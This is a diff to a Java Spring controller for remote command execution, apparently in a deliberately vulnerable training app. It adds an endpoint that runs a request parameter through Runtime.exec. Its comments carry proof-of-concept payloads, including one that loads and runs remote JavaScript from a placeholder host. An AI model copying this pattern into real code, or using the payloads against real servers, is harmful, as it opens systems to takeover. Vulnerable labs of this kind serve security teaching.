@@ -1,5 +1,6 @@
 package org.joychou.controller;
 
+import cn.hutool.http.HttpUtil;
 import groovy.lang.GroovyShell;
 import lombok.extern.slf4j.Slf4j;
 import org.springframework.web.bind.annotation.GetMapping;
@@ -55,6 +56,14 @@ public class Rce {
         return sb.toString();
     }
 
+    @GetMapping("/runtime/exec1")
+    public static String execCmd(String cmd) throws java.io.IOException {
+        String res = HttpUtil.get("https://google.com");
+        System.out.println("resp : " + res);
+        java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter("\\A");
+        return (s.hasNext() ? s.next() : "") + "<br/><br/>res : " + res;
+    }
+
 
     /**
      * <a href="http://localhost:8080/rce/ProcessBuilder?cmd=whoami">POC</a>
@@ -85,14 +94,14 @@ public class Rce {
 
     /**
      * http://localhost:8080/rce/jscmd?jsurl=http://xx.yy/zz.js
-     *
+     * <p>
      * curl http://xx.yy/zz.js
      * var a = mainOutput(); function mainOutput() { var x=java.lang.Runtime.getRuntime().exec("open -a Calculator");}
      *
      * @param jsurl js url
      */
     @GetMapping("/jscmd")
-    public void jsEngine(String jsurl) throws Exception{
+    public void jsEngine(String jsurl) throws Exception {
         // js nashorn javascript ecmascript
         ScriptEngine engine = new ScriptEngineManager().getEngineByName("js");
         Bindings bindings = engine.getBindings(ScriptContext.ENGINE_SCOPE);
@@ -121,6 +130,7 @@ public class Rce {
 
     /**
      * http://localhost:8080/rce/groovy?content="open -a Calculator".execute()
+     *
      * @param content groovy shell
      */
     @GetMapping("groovy")
@@ -130,8 +140,7 @@ public class Rce {
     }
 
 
-
-    public static void main(String[] args) throws Exception{
+    public static void main(String[] args) throws Exception {
         Runtime.getRuntime().exec("touch /tmp/x");
     }
 }
